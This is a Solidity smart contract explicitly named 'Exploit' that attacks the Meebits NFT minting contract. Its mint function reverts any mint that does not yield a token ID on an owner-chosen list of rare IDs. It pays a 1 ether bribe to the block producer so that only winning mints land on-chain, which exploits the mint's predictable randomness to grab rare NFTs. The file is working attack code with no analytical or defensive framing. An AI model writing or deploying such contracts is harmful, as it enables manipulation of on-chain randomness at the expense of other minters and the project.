pragma solidity 0.8.4;

interface IMeebits {
    function mintWithPunkOrGlyph(uint _createVia) external returns (uint);
}

contract Exploit {

    address private owner;
    mapping(uint => bool) internal meebitIds;
    IMeebits immutable meebits;
    
    constructor(address addr) {
        owner = msg.sender;
        meebits = IMeebits(addr);
    }

    event OwnerSet(address indexed owner, address indexed _newOwnerAddr);

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    function deposit() public payable {}

    function getOwner() public view returns(address) {
        return owner;
    }

    function changeOwner(address _newOwnerAddr) onlyOwner public {
        emit OwnerSet(owner, _newOwnerAddr);
        owner = _newOwnerAddr;
    }

    function isRareMeebit(uint meebitId) public view returns(bool) {
        return meebitIds[meebitId];
    }

    function addMeebit(uint meebitId) onlyOwner public {
        meebitIds[meebitId] = true;
    }
    function deleteMeebit(uint meebitId) onlyOwner public {
        meebitIds[meebitId] = false;
    }

    function mintMeebit(uint _createVia) public returns(uint){

        // Mint a new meebit with a punk or glyph
        uint id = meebits.mintWithPunkOrGlyph(_createVia);

        // Make sure it's a desired rare meebit
        require(meebitIds[id], "Not a rare meebit");
        
        // Pay miner bribe to include the block
        (bool success, ) = block.coinbase.call{value: 1 ether}("");
        require(success);
        return id;
    }

    function recover(address recipient, uint256 value, bytes memory args) onlyOwner public {
        (bool success, ) = recipient.call{ value: value }(args);
        require(success);
    }


}